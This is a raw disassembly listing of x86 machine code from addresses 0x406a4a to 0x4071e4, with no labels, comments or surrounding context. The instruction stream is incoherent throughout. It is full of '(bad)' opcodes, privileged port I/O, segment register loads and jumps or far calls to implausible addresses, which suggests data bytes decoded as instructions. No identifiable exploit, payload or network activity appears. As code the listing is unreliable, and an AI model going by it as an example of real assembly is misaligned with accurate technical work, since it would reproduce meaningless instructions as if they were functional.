  406a4a:	aam    0xdd
  406a4c:	pop    ds
  406a4d:	int3   
  406a4e:	dec    edx
  406a4f:	dec    edi
  406a50:	in     eax,dx
  406a51:	push   edx
  406a52:	out    0xc6,al
  406a54:	adc    cl,BYTE PTR ds:0xd8dd8c54
  406a5a:	adc    DWORD PTR [esi],edx
  406a5c:	js     0x406aaf
  406a5e:	ret    
  406a5f:	ins    BYTE PTR es:[edi],dx
  406a60:	cmp    dh,cl
  406a62:	cwde   
  406a63:	gs pop edx
  406a65:	adc    al,BYTE PTR [eax]
  406a67:	or     al,bl
  406a69:	xor    ecx,DWORD PTR [esi-0x52]
  406a6c:	lds    ebx,FWORD PTR [ecx-0x77]
  406a6f:	add    BYTE PTR [ecx-0x68],dl
  406a72:	out    0x7c,eax
  406a74:	lea    ebp,[esi+0x7a5c2b2a]
  406a7a:	pusha  
  406a7b:	pop    ebx
  406a7c:	cmp    eax,0xc208ca09
  406a81:	pop    esi
  406a82:	cmp    al,0xcb
  406a84:	jnp    0x406a8a
  406a86:	sub    DWORD PTR [eax+ebx*4],edi
  406a89:	xchg   ebp,eax
  406a8a:	adc    DWORD PTR [edx+0x3e],0xf5987f62
  406a91:	adc    esp,esp
  406a93:	(bad)  
  406a94:	(bad)  
  406a95:	push   esp
  406a96:	mov    eax,0xba0b0341
  406a9b:	daa    
  406a9c:	push   ds
  406a9d:	stc    
  406a9e:	or     DWORD PTR [esi-0x5],ecx
  406aa1:	mov    al,ds:0x7f5a5fee
  406aa6:	sbb    al,ah
  406aa8:	ins    BYTE PTR es:[edi],dx
  406aa9:	sub    BYTE PTR ds:0xd21872f5,ch
  406aaf:	inc    eax
  406ab0:	lods   al,BYTE PTR ds:[esi]
  406ab1:	addr16 jno 0x406b1e
  406ab4:	adc    dl,ah
  406ab6:	dec    esp
  406ab7:	pop    edx
  406ab8:	ins    BYTE PTR es:[edi],dx
  406ab9:	fsubr  DWORD PTR [edi-0x2a67c42e]
  406abf:	add    ebp,DWORD PTR [ebx+0x40]
  406ac2:	sub    eax,ecx
  406ac4:	jge    0x406a8e
  406ac6:	push   esi
  406ac7:	lods   eax,DWORD PTR ds:[esi]
  406ac8:	push   eax
  406ac9:	popf   
  406aca:	and    BYTE PTR ds:0x425d3051,ah
  406ad0:	pop    esi
  406ad1:	mov    edi,0xba2e93b0
  406ad6:	mov    WORD PTR [esi],ss
  406ad8:	add    ah,al
  406ada:	outs   dx,BYTE PTR ds:[esi]
  406adb:	xchg   ecx,eax
  406adc:	dec    edx
  406add:	dec    edx
  406ade:	sbb    ebp,DWORD PTR [ecx]
  406ae0:	sub    bh,BYTE PTR [ebx]
  406ae2:	xchg   edx,eax
  406ae3:	cmp    esi,esp
  406ae5:	jns    0x406ac8
  406ae7:	pop    ss
  406ae8:	aaa    
  406ae9:	pop    eax
  406aea:	sub    esi,DWORD PTR [ebx-0x4e]
  406aed:	jnp    0x406ac2
  406aef:	xor    eax,0x8430cfa3
  406af4:	pand   mm1,QWORD PTR [esi+eiz*2-0x16]
  406af9:	aas    
  406afa:	bnd jp 0x406b54
  406afd:	mov    ds,WORD PTR [edx]
  406aff:	lahf   
  406b00:	stos   BYTE PTR es:[edi],al
  406b01:	imul   edi,DWORD PTR [edi],0x60
  406b04:	dec    ecx
  406b05:	outs   dx,DWORD PTR ds:[esi]
  406b06:	imul   eax,DWORD PTR [edx-0x7258bc49],0x8877c2f1
  406b10:	pop    edx
  406b11:	(bad)
  406b15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b16:	mov    ch,0xb0
  406b18:	pop    esp
  406b19:	cmp    esi,ebp
  406b1b:	push   edx
  406b1c:	test   BYTE PTR [esi],0xa9
  406b1f:	or     ecx,ebp
  406b21:	popf   
  406b22:	dec    edi
  406b23:	(bad)  
  406b24:	sbb    BYTE PTR [eax+0x619ae88d],al
  406b2a:	rcl    BYTE PTR [edi-0x47864299],0xa
  406b31:	adc    ebp,DWORD PTR [ecx+0x5d]
  406b34:	sahf   
  406b35:	and    BYTE PTR ds:0x6bf907ae,0xcf
  406b3c:	ja     0x406ae0
  406b3e:	repnz mov dl,0xa
  406b41:	sbb    ebp,DWORD PTR [edx-0x2335f5b2]
  406b47:	and    dh,al
  406b49:	jbe    0x406b53
  406b4b:	ss pop ds
  406b4d:	xor    al,0x8d
  406b4f:	fsub   QWORD PTR ds:0x8b3c7710
  406b55:	pushf  
  406b56:	and    eax,0xcc3d5ffa
  406b5b:	into   
  406b5c:	leave  
  406b5d:	push   0xffffff9b
  406b5f:	(bad)  
  406b60:	mov    ebp,0xf25a869f
  406b65:	dec    ebp
  406b66:	inc    ecx
  406b67:	mov    ds:0x6fcef884,al
  406b6c:	loopne 0x406b3b
  406b6e:	sbb    bl,cl
  406b70:	mov    edx,0xf37d1f08
  406b75:	and    eax,0xceec9bb9
  406b7a:	ds mov dl,0x3
  406b7d:	outs   dx,BYTE PTR ds:[esi]
  406b7e:	jbe    0x406b26
  406b80:	bnd jbe 0x406bd8
  406b83:	pop    ebx
  406b84:	lahf   
  406b85:	dec    ebp
  406b86:	jns    0x406be0
  406b88:	fstp   DWORD PTR [edi]
  406b8a:	dec    ebx
  406b8b:	pop    esi
  406b8c:	push   edi
  406b8d:	pop    ds
  406b8e:	and    al,0xa9
  406b90:	jb     0x406b84
  406b92:	test   BYTE PTR [ebx-0x5936499f],0x28
  406b99:	mov    BYTE PTR [edx],dl
  406b9b:	adc    eax,0xf2095f77
  406ba0:	cmc    
  406ba1:	(bad)  
  406ba2:	out    dx,al
  406ba3:	and    esi,DWORD PTR [ecx+ebp*2]
  406ba6:	mov    eax,0xf43141b8
  406bab:	xor    al,0x17
  406bad:	inc    edi
  406bae:	clc    
  406baf:	mov    ebx,0x14fda774
  406bb4:	cs xchg sp,ax
  406bb7:	or     BYTE PTR [eax],dl
  406bb9:	mov    al,ds:0xd02a12cc
  406bbe:	sbb    eax,0x826dd7e4
  406bc3:	pop    edi
  406bc4:	mov    bl,cl
  406bc6:	push   DWORD PTR [edx-0x77696a4a]
  406bcc:	das    
  406bcd:	add    DWORD PTR [eax+0x34],edi
  406bd0:	int    0xce
  406bd2:	xor    eax,ebp
  406bd4:	mov    esp,ebp
  406bd6:	push   0x91bf477b
  406bdb:	push   edx
  406bdc:	xchg   BYTE PTR [ecx+0x59],cl
  406bdf:	jbe    0x406b63
  406be1:	mov    ebx,0xb5b432dd
  406be6:	mov    bh,0xda
  406be8:	cmp    eax,DWORD PTR [edi+0x1e]
  406beb:	push   edx
  406bec:	cdq    
  406bed:	out    0x40,al
  406bef:	outs   dx,DWORD PTR ds:[esi]
  406bf0:	sub    edi,DWORD PTR cs:[edi]
  406bf3:	(bad)  
  406bf5:	imul   ebx,DWORD PTR [edi+0x70],0x7bc03bf
  406bfc:	ret    
  406bfd:	scas   al,BYTE PTR es:[edi]
  406bfe:	sub    edi,DWORD PTR [ebx]
  406c00:	std    
  406c01:	jns    0x406ba8
  406c03:	inc    ebp
  406c04:	js     0x406c4a
  406c06:	pusha  
  406c07:	and    al,0x93
  406c09:	aad    0x1f
  406c0b:	(bad)  
  406c0c:	mov    ebp,0xe7da8920
  406c11:	ja     0x406c27
  406c13:	xor    bh,BYTE PTR [eax-0x10]
  406c16:	mov    ds:0xfbd24b0f,eax
  406c1b:	push   cs
  406c1c:	imul   ebp,DWORD PTR [esi],0xd615d6b9
  406c22:	neg    DWORD PTR [ebx]
  406c24:	pusha  
  406c25:	sub    DWORD PTR [ecx+0x28e01277],edi
  406c2b:	or     esp,DWORD PTR ds:0x4ee26f3
  406c31:	lods   eax,DWORD PTR ds:[esi]
  406c32:	cmp    DWORD PTR [esi],0xf5ac5c3b
  406c38:	aaa    
  406c39:	adc    BYTE PTR [esi+esi*4+0x45f8a33c],al
  406c40:	add    dh,BYTE PTR cs:[ecx-0x38296bb]
  406c47:	cmp    BYTE PTR [ecx+eax*8+0x4a],0x9a
  406c4c:	add    al,0x6b
  406c4e:	pop    edi
  406c4f:	rcl    BYTE PTR [ebx],0x61
  406c52:	fwait
  406c53:	daa    
  406c54:	pop    ebp
  406c55:	adc    DWORD PTR [edx],ebx
  406c57:	cs movs BYTE PTR es:[edi],BYTE PTR cs:[esi]
  406c5a:	imul   edi,DWORD PTR [eax-0x7452993a],0x7a7ac12d
  406c64:	js     0x406c0a
  406c66:	mov    ds:0x50200d0d,al
  406c6b:	or     ebp,DWORD PTR [ecx+0x9]
  406c6e:	lods   al,BYTE PTR ds:[esi]
  406c6f:	sub    DWORD PTR [ecx],ebx
  406c71:	popa   
  406c72:	test   BYTE PTR [esi],dh
  406c74:	cmp    BYTE PTR [edx],0xa9
  406c77:	push   0x1e
  406c79:	scas   al,BYTE PTR es:[edi]
  406c7a:	fcmovbe st,st(2)
  406c7c:	jnp    0x406c95
  406c7e:	cmp    DWORD PTR [edx+0x23],edx
  406c81:	cli    
  406c82:	mov    al,0xa2
  406c84:	sbb    al,0x5c
  406c86:	pop    eax
  406c87:	aad    0x1e
  406c89:	rol    BYTE PTR [eax-0x3d],1
  406c8c:	fs sti 
  406c8e:	sbb    DWORD PTR [ebx+0x4a8b5865],esp
  406c94:	mov    al,0x70
  406c96:	(bad)  
  406c97:	cli    
  406c98:	cmp    eax,0x4dcba573
  406c9d:	add    DWORD PTR [edx],ebp
  406c9f:	mov    bh,0x84
  406ca1:	mov    dl,0x38
  406ca3:	jp     0x406c8b
  406ca5:	sahf   
  406ca6:	les    edi,FWORD PTR [eax+edi*2]
  406ca9:	loopne 0x406cec
  406cab:	in     eax,0x6a
  406cad:	sbb    al,0xd3
  406caf:	mov    esp,0x3c3d6bc6
  406cb4:	cs push cs
  406cb6:	xchg   BYTE PTR [eax-0x8],dh
  406cb9:	jg     0x406cdd
  406cbb:	sbb    BYTE PTR [ebx],bl
  406cbd:	dec    edi
  406cbe:	cmp    eax,0xd485ec53
  406cc3:	pop    ebx
  406cc4:	inc    ecx
  406cc5:	pop    ebp
  406cc6:	mov    eax,0x4c9bbc7d
  406ccb:	into   
  406ccc:	mov    dh,0xb6
  406cce:	dec    esi
  406ccf:	fmul   DWORD PTR [edi+eiz*1-0x38780354]
  406cd6:	int    0xae
  406cd8:	pushf  
  406cd9:	inc    ecx
  406cda:	inc    ecx
  406cdb:	leave  
  406cdc:	mov    edx,0xcef11b4c
  406ce1:	push   esi
  406ce2:	push   esp
  406ce3:	adc    DWORD PTR [edx+0x732654e9],0x461cbfe5
  406ced:	sub    BYTE PTR [esi],bh
  406cef:	mov    ah,0xa9
  406cf1:	dec    edx
  406cf2:	push   0x46
  406cf4:	pop    ebp
  406cf5:	xor    ch,BYTE PTR [eax-0x26cc467]
  406cfb:	in     eax,0x70
  406cfd:	jp     0x406cf4
  406cff:	pop    es
  406d00:	fisttp QWORD PTR [ecx-0x155a0ddb]
  406d06:	int    0x47
  406d08:	cld    
  406d09:	fcomp  DWORD PTR [edx+0x694f681e]
  406d0f:	dec    ecx
  406d10:	loop   0x406d22
  406d12:	jecxz  0x406c9e
  406d14:	data16 ficomp DWORD PTR [edi-0x73]
  406d18:	(bad)  
  406d19:	or     esp,DWORD PTR [edi-0x16]
  406d1c:	jo     0x406d0a
  406d1e:	cld    
  406d1f:	mov    bh,0x22
  406d21:	mov    esp,0x230913e4
  406d26:	add    BYTE PTR [eax-0x231fa29b],bl
  406d2c:	mov    edi,0xc9d17313
  406d31:	adc    BYTE PTR [ebx+0x42383809],0xda
  406d38:	push   ss
  406d39:	or     bh,BYTE PTR [ecx]
  406d3b:	push   esi
  406d3c:	fs or  al,0x18
  406d3f:	dec    edi
  406d40:	fwait
  406d41:	pop    es
  406d42:	out    0x37,al
  406d44:	sbb    DWORD PTR [esi],eax
  406d46:	inc    ebp
  406d47:	fwait
  406d48:	push   DWORD PTR [ebp-0x34]
  406d4b:	mov    ebx,0x86500f89
  406d50:	lss    edx,FWORD PTR [ecx+0x5f]
  406d54:	and    DWORD PTR [esi-0x7c],esp
  406d57:	into   
  406d58:	inc    ebp
  406d59:	rol    BYTE PTR [ebp-0x3e173d06],cl
  406d5f:	ss std 
  406d61:	adc    edi,eax
  406d63:	pmulhuw mm1,QWORD PTR [ebx+0xd193790]
  406d6a:	ror    DWORD PTR [edi-0x6ef9a264],1
  406d70:	enter  0x95ba,0x5f
  406d74:	pop    edx
  406d75:	enter  0xadae,0x66
  406d79:	out    0xa2,al
  406d7b:	int3   
  406d7c:	sub    BYTE PTR [esi],cl
  406d7e:	inc    ebp
  406d7f:	es jg  0x406d58
  406d82:	out    0x37,eax
  406d84:	mov    eax,0x59233192
  406d89:	sbb    al,0x54
  406d8b:	xor    al,0xa
  406d8d:	push   0x52
  406d8f:	out    dx,al
  406d90:	(bad)  [esi-0x1bdcea01]
  406d96:	jnp    0x406d3f
  406d98:	daa    
  406d99:	jg     0x406d6b
  406d9b:	add    bl,BYTE PTR ss:[eax+0x5f6e55e2]
  406da2:	scas   eax,DWORD PTR es:[edi]
  406da3:	cwde   
  406da4:	jnp    0x406d60
  406da6:	(bad)  
  406da7:	test   al,0x1c
  406da9:	loop   0x406e29
  406dab:	rcl    DWORD PTR [ebx-0x2e7853f5],1
  406db1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406db2:	ja     0x406e14
  406db4:	push   ebp
  406db5:	dec    edi
  406db6:	mov    al,ds:0xc3e1d87c
  406dbb:	in     al,dx
  406dbc:	fld    QWORD PTR [ecx]
  406dbe:	repnz jecxz 0x406d9e
  406dc1:	mov    edx,0xfc477439
  406dc6:	xadd   BYTE PTR [eax+0x49c886d3],bh
  406dcd:	and    BYTE PTR [ebp+0x4a9fea0d],bh
  406dd3:	(bad)  
  406dd5:	and    eax,0x6ddeb4c1
  406dda:	je     0x406db5
  406ddc:	nop
  406ddd:	in     al,dx
  406dde:	fcomp  QWORD PTR [esi]
  406de0:	shl    DWORD PTR [esi],1
  406de2:	cmp    ah,BYTE PTR [edx+0x39]
  406de5:	nop
  406de6:	pop    ss
  406de7:	hlt    
  406de8:	mov    eax,0xd994813e
  406ded:	cwde   
  406dee:	outs   dx,DWORD PTR ds:[esi]
  406def:	dec    ebp
  406df0:	jo     0x406dfc
  406df2:	repz lock jecxz 0x406e53
  406df6:	mov    al,ds:0xc9ef296
  406dfb:	(bad)  
  406dfc:	jecxz  0x406e76
  406dfe:	inc    ecx
  406dff:	adc    BYTE PTR ds:0x19a698fa,bh
  406e05:	sbb    al,0xb6
  406e07:	pop    ss
  406e08:	and    al,0xd7
  406e0a:	and    al,0xb3
  406e0c:	cmp    edi,edx
  406e0e:	(bad)  [eax]
  406e10:	mov    bl,0x88
  406e12:	mov    ebx,DWORD PTR ds:0x6a252d3b
  406e18:	and    DWORD PTR [ebp+edi*2+0x77],ebp
  406e1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e1d:	sub    esp,DWORD PTR [ebp-0x14]
  406e20:	scas   al,BYTE PTR es:[edi]
  406e21:	dec    eax
  406e22:	mov    ds:0x56826b39,eax
  406e27:	inc    ebx
  406e28:	sbb    ebx,DWORD PTR [ecx+0x60]
  406e2b:	add    BYTE PTR [esi+0x5ab82cd3],cl
  406e31:	adc    dh,bl
  406e33:	imul   eax,DWORD PTR [eax],0x4b
  406e36:	ds pop esi
  406e38:	and    DWORD PTR [ecx-0x15],0x60e5a730
  406e3f:	jge    0x406df5
  406e41:	or     DWORD PTR ds:0x82b9506d,0x897c45b0
  406e4b:	scas   eax,DWORD PTR es:[di]
  406e4d:	push   0x7934ca92
  406e52:	ins    DWORD PTR es:[edi],dx
  406e53:	call   0x2f01f89d
  406e58:	retf   0xa45c
  406e5b:	test   eax,0xf29c54f0
  406e60:	or     dl,dl
  406e62:	mov    edx,0xb642a947
  406e67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e68:	loop   0x406edd
  406e6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e6b:	repz mov bh,0x19
  406e6e:	xor    al,0x13
  406e70:	jmp    0x73cf:0xe121a4be
  406e77:	adc    eax,0x92e5601c
  406e7c:	(bad)  
  406e7d:	loope  0x406e50
  406e7f:	jmp    0xd14019dd
  406e84:	mov    ah,0x3
  406e86:	bound  esi,QWORD PTR [eax+ecx*8]
  406e89:	ins    BYTE PTR es:[edi],dx
  406e8a:	out    dx,al
  406e8b:	stos   DWORD PTR es:[edi],eax
  406e8c:	jns    0x406ede
  406e8e:	imul   edx,DWORD PTR [ebp+0x7828b396],0x10
  406e95:	sub    al,0xbc
  406e97:	(bad)  
  406e98:	push   ecx
  406e99:	push   ebp
  406e9a:	dec    edi
  406e9b:	sub    al,0xa5
  406e9d:	out    dx,al
  406e9e:	mov    ds:0x6bc99db5,al
  406ea3:	cmp    bh,BYTE PTR [edx+eax*8+0x58725250]
  406eaa:	xor    BYTE PTR [ecx+0x6a],0xa8
  406eae:	and    al,0x83
  406eb0:	popa   
  406eb1:	add    eax,0x716fefa1
  406eb6:	int    0x6a
  406eb8:	test   al,0x27
  406eba:	(bad)  
  406ebb:	cmp    ecx,DWORD PTR [esi+esi*4]
  406ebe:	sub    eax,ebx
  406ec0:	jno    0x406e91
  406ec2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ec3:	js     0x406e7d
  406ec5:	cmp    DWORD PTR [edi],esi
  406ec7:	shr    DWORD PTR [edi-0x52e9922a],1
  406ecd:	xor    DWORD PTR [eax+0x28],ebx
  406ed0:	(bad)  
  406ed1:	lods   al,BYTE PTR ds:[esi]
  406ed2:	je     0x406e97
  406ed4:	ja     0x406ec2
  406ed6:	push   esi
  406ed7:	dec    esi
  406ed8:	repnz mov edx,DWORD PTR [ecx+eiz*8-0x63662df4]
  406ee0:	sub    dh,BYTE PTR [ebx]
  406ee2:	pop    ds
  406ee3:	and    BYTE PTR [esi+0x44eface4],al
  406ee9:	jbe    0x406ed3
  406eeb:	push   esi
  406eec:	aad    0xa2
  406eee:	sbb    ebp,DWORD PTR [eax+0x0]
  406ef1:	fistp  QWORD PTR [esi+0x1207f748]
  406ef7:	sub    eax,0xa7d3cb77
  406efc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406efd:	xor    eax,0x45eae0e4
  406f02:	inc    ebp
  406f03:	fidiv  DWORD PTR [esi+0x63]
  406f06:	dec    eax
  406f07:	and    BYTE PTR [eax-0x6bb48865],ah
  406f0d:	mov    ebx,0x28a9a040
  406f12:	and    ebx,DWORD PTR [esi]
  406f14:	add    ebx,ebp
  406f16:	fiadd  DWORD PTR [edx+eiz*4-0x5d]
  406f1a:	lods   al,BYTE PTR ds:[esi]
  406f1b:	pop    eax
  406f1c:	stos   DWORD PTR es:[edi],eax
  406f1d:	sub    BYTE PTR [esi-0x3f814916],0xa6
  406f24:	adc    al,0x23
  406f26:	fwait
  406f27:	out    dx,eax
  406f28:	sbb    dl,BYTE PTR [ecx-0x56]
  406f2b:	push   es
  406f2c:	inc    ebx
  406f2d:	mov    bh,0x2
  406f2f:	pop    eax
  406f30:	mov    ch,0xac
  406f32:	add    al,0x9a
  406f34:	out    0xd7,eax
  406f36:	pop    ds
  406f37:	(bad)  
  406f38:	jmp    0x406f91
  406f3a:	sti    
  406f3b:	data16 jns 0x406ee9
  406f3e:	adc    DWORD PTR [ecx-0x39],ebp
  406f41:	xchg   edi,eax
  406f42:	jg     0x406f71
  406f44:	push   ds
  406f45:	dec    eax
  406f46:	push   ebx
  406f47:	dec    edx
  406f48:	(bad)  [esi-0x4de0dfbd]
  406f4e:	ds jl  0x406eea
  406f51:	cld    
  406f52:	addr16 mov dl,0xdc
  406f55:	push   edi
  406f56:	mov    esp,0xbd420a78
  406f5b:	adc    bl,BYTE PTR ds:0xd6b0f4cf
  406f61:	jl     0x406fb3
  406f63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f64:	push   ds
  406f65:	or     BYTE PTR [eax-0x3a661118],0xb7
  406f6c:	xor    ch,BYTE PTR [ebx-0x288b5ffe]
  406f72:	pop    ss
  406f73:	aam    0x5
  406f75:	mov    ebp,0x8e1fcf0f
  406f7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f7b:	mov    al,ds:0xd09160
  406f80:	scas   al,BYTE PTR es:[edi]
  406f81:	mov    edi,DWORD PTR [ebx-0x21]
  406f84:	test   al,0x41
  406f86:	xor    ch,BYTE PTR [edx]
  406f88:	ins    BYTE PTR es:[edi],dx
  406f89:	ror    BYTE PTR [ebx+0x1],0xe1
  406f8d:	arpl   WORD PTR ds:0x4f1bea1,di
  406f93:	sar    BYTE PTR [edi-0x5b68a66d],cl
  406f99:	push   edi
  406f9a:	cmp    eax,0x5df6939a
  406f9f:	pop    ss
  406fa0:	jns    0x406ff1
  406fa2:	pop    esp
  406fa3:	jle    0x406f7b
  406fa5:	push   0x4d
  406fa7:	inc    ebx
  406fa8:	mov    bh,0xf0
  406faa:	fcmovne st,st(5)
  406fac:	xor    eax,0xd60b6d6f
  406fb1:	jno    0x407026
  406fb3:	repz and ebp,DWORD PTR [esi+0x64942382]
  406fba:	aad    0x70
  406fbc:	inc    ebx
  406fbd:	dec    esp
  406fbe:	ret    
  406fbf:	or     eax,0x2538fb80
  406fc4:	inc    esi
  406fc5:	adc    eax,0x6ccdc18c
  406fca:	inc    esi
  406fcb:	cli    
  406fcc:	fbld   TBYTE PTR [esp+ecx*4-0x68]
  406fd0:	mov    ebx,0x9bf2a49
  406fd5:	test   DWORD PTR [eax+esi*1],0xcdaa01d3
  406fdc:	psrld  mm2,QWORD PTR [ebx]
  406fdf:	bound  edi,QWORD PTR [edx+eax*8]
  406fe2:	rol    BYTE PTR [eax+0x27],1
  406fe5:	out    0x97,eax
  406fe7:	pop    esi
  406fe8:	retf   0xfe9f
  406feb:	cdq    
  406fec:	sbb    ebx,DWORD PTR [edx-0x7f]
  406fef:	and    DWORD PTR [esi+ecx*4],esp
  406ff2:	out    dx,eax
  406ff3:	sti    
  406ff4:	sbb    esi,DWORD PTR [ebx]
  406ff6:	popa   
  406ff7:	inc    esp
  406ff8:	cld    
  406ff9:	in     eax,dx
  406ffa:	call   0x874f2c90
  406fff:	add    DWORD PTR [edx+eax*2-0x27],edx
  407003:	mov    bl,0x72
  407005:	add    BYTE PTR [ebx+0xadd9f89],0xd4
  40700c:	mov    ds:0x92f28d4c,al
  407011:	adc    DWORD PTR [esi+0x68],ecx
  407014:	jnp    0x407049
  407016:	mov    ah,0x20
  407018:	inc    ebx
  407019:	enter  0x11c8,0xf9
  40701d:	fadd   QWORD PTR [ebx+edx*8+0x628c523f]
  407024:	ins    DWORD PTR es:[edi],dx
  407025:	scas   eax,DWORD PTR es:[edi]
  407026:	xor    al,0x40
  407028:	getsec 
  40702a:	xchg   edi,eax
  40702b:	retf   0x7d98
  40702e:	(bad)  
  40702f:	dec    ecx
  407030:	retf   0xffb8
  407033:	(bad)  
  407034:	out    0xfc,eax
  407036:	and    BYTE PTR [ebx],ch
  407038:	in     al,0x59
  40703a:	jecxz  0x406ffa
  40703c:	or     eax,DWORD PTR [eax]
  40703e:	call   0xb11ad81e
  407043:	lock cwde 
  407045:	imul   esi,DWORD PTR [ecx-0x44],0x2c
  407049:	adc    al,0x46
  40704b:	nop
  40704c:	(bad)  
  40704d:	sahf   
  40704e:	mov    ds:0x592cca87,al
  407053:	push   cs
  407054:	sbb    dh,cl
  407056:	outs   dx,BYTE PTR ds:[esi]
  407057:	push   edi
  407058:	mov    bl,0x54
  40705a:	aaa    
  40705b:	arpl   WORD PTR [eax+0x1f1d0dae],sp
  407061:	dec    esp
  407062:	push   eax
  407063:	xor    edi,edi
  407065:	mov    esi,0x677dda66
  40706a:	push   ebx
  40706b:	aaa    
  40706c:	and    al,BYTE PTR [edi]
  40706e:	dec    esp
  40706f:	stos   DWORD PTR es:[edi],eax
  407070:	xlat   BYTE PTR ds:[ebx]
  407071:	push   edx
  407072:	int3   
  407073:	xlat   BYTE PTR ds:[ebx]
  407074:	pop    ebp
  407075:	jmp    0x2d4978ec
  40707a:	dec    ecx
  40707b:	(bad)  
  40707c:	jle    0x4070cc
  40707e:	or     al,0x4e
  407080:	xchg   ebx,eax
  407081:	repz fisubr WORD PTR [eax-0x1ef68163]
  407088:	call   0x674d:0x1d802078
  40708f:	fwait
  407090:	pushf  
  407091:	mov    al,ds:0xbd842f59
  407096:	pop    eax
  407097:	mov    al,ds:0x41f05812
  40709c:	pop    ebx
  40709d:	sub    al,0x29
  40709f:	push   eax
  4070a0:	push   edx
  4070a1:	jmp    0x71bd9db1
  4070a6:	fnstsw WORD PTR [ebx-0x158f50ea]
  4070ac:	and    BYTE PTR ds:0x1f025f4c,ah
  4070b2:	js     0x407133
  4070b4:	(bad)
  4070b8:	ror    BYTE PTR [ebp+0x44],0x83
  4070bc:	sbb    DWORD PTR [ebx+0x9],esi
  4070bf:	mov    al,0xd4
  4070c1:	add    BYTE PTR [eax+esi*8+0x1cb5515e],al
  4070c8:	pop    ebp
  4070c9:	xor    esi,DWORD PTR [esi]
  4070cb:	out    0x1c,al
  4070cd:	mov    BYTE PTR [esi-0x38d9702d],dl
  4070d3:	pop    edx
  4070d4:	aas    
  4070d5:	jle    0x407072
  4070d7:	mov    ebx,0x3f4ae2a
  4070dc:	mul    DWORD PTR [ebx+0x7c]
  4070df:	out    dx,al
  4070e0:	mov    ebx,0x8897f1d3
  4070e5:	lds    esp,FWORD PTR [eax]
  4070e7:	jmp    0x60cdbf5
  4070ec:	pop    esp
  4070ed:	(bad)  
  4070ee:	out    dx,eax
  4070ef:	xor    ebp,DWORD PTR [ecx-0x24]
  4070f2:	jp     0x4070fc
  4070f4:	push   ds
  4070f5:	aad    0x8
  4070f7:	lods   al,BYTE PTR ds:[esi]
  4070f8:	repz cli 
  4070fa:	gs pop ds
  4070fc:	xlat   BYTE PTR ds:[ebx]
  4070fd:	(bad)  
  4070fe:	jecxz  0x407161
  407100:	mov    esi,0xcccd16e7
  407105:	sub    DWORD PTR [ebx-0x3b],edi
  407108:	adc    al,0x2e
  40710a:	call   0x5ead:0xb984f1a2
  407111:	pushf  
  407112:	sbb    dl,BYTE PTR [edx+edi*8]
  407115:	and    eax,0xeea95711
  40711a:	xchg   DWORD PTR [ebp-0x4fa0683],ebp
  407120:	push   0xffffff80
  407122:	out    dx,eax
  407123:	daa    
  407124:	outs   dx,BYTE PTR ds:[esi]
  407125:	ins    DWORD PTR es:[edi],dx
  407126:	cwde   
  407127:	mov    ebx,0x814979f2
  40712c:	xchg   edx,eax
  40712d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40712e:	or     BYTE PTR [edi-0x2e48b505],bl
  407134:	stos   DWORD PTR es:[edi],eax
  407135:	out    dx,al
  407136:	or     ah,BYTE PTR [ebx+esi*2-0x55]
  40713a:	test   DWORD PTR [esi+eax*4-0x12],ebp
  40713e:	inc    ecx
  40713f:	(bad)  
  407140:	cdq    
  407141:	and    al,0xc9
  407143:	adc    ebx,eax
  407145:	lods   al,BYTE PTR ds:[esi]
  407146:	dec    edi
  407147:	inc    ebp
  407148:	xor    BYTE PTR [ecx-0x20d15bf3],cl
  40714e:	popa   
  40714f:	xor    al,BYTE PTR [ebp-0x331c64d0]
  407155:	jge    0x407123
  407157:	rol    bh,cl
  407159:	xor    DWORD PTR [ebx+edi*8-0x5069c4d1],eax
  407160:	scas   eax,DWORD PTR es:[edi]
  407161:	(bad)  
  407162:	push   eax
  407163:	push   0x3a
  407165:	mov    ch,0xd5
  407167:	cmc    
  407168:	out    dx,eax
  407169:	adc    esp,DWORD PTR [eax]
  40716b:	push   eax
  40716c:	data16 jnp 0x4071de
  40716f:	fistp  WORD PTR [ecx]
  407171:	icebp  
  407172:	imul   esp,DWORD PTR [ebx-0xf],0x433f5b07
  407179:	inc    ecx
  40717a:	pop    esi
  40717b:	fwait
  40717c:	(bad)  
  40717e:	jecxz  0x40712a
  407180:	fistp  DWORD PTR [edi-0x4a]
  407183:	mov    edx,0x73f8c01b
  407188:	mov    cs,esi
  40718a:	repz shr edx,0x94
  40718e:	test   DWORD PTR [edx+0x29847076],esi
  407194:	sub    bh,BYTE PTR [edx+ebx*2-0x12]
  407198:	test   eax,0xf8b4275a
  40719d:	(bad)  
  40719e:	inc    esi
  40719f:	(bad)  
  4071a0:	(bad)  
  4071a1:	ror    BYTE PTR [ebx],0xe7
  4071a4:	jns    0x40712a
  4071a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4071a7:	xor    al,al
  4071a9:	push   cs
  4071aa:	scas   eax,DWORD PTR es:[edi]
  4071ab:	jle    0x4071ec
  4071ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071ae:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071b0:	dec    esi
  4071b1:	sbb    al,0x39
  4071b3:	add    edx,ebx
  4071b5:	cld    
  4071b6:	mov    bh,0xc9
  4071b8:	mov    esp,0xa727c14a
  4071bd:	into   
  4071be:	xchg   ecx,eax
  4071bf:	mov    bh,0xf4
  4071c1:	ins    DWORD PTR es:[edi],dx
  4071c2:	mov    edi,0xab858843
  4071c7:	stos   DWORD PTR es:[edi],eax
  4071c8:	mov    ds:0x7dd74084,al
  4071cd:	popa   
  4071ce:	add    BYTE PTR [eax],0xc6
  4071d1:	fcmovnu st,st(7)
  4071d3:	fwait
  4071d4:	sub    edx,DWORD PTR [ebx]
  4071d6:	pop    ds
  4071d7:	jge    0x4071d2
  4071d9:	cmp    al,0xe7
  4071db:	aas    
  4071dc:	or     DWORD PTR [ecx-0x4180a425],esi
  4071e2:	cwde   
  4071e3:	std    
  4071e4:	imul   edi,DWORD PTR [ebx],0x71fdd7c7
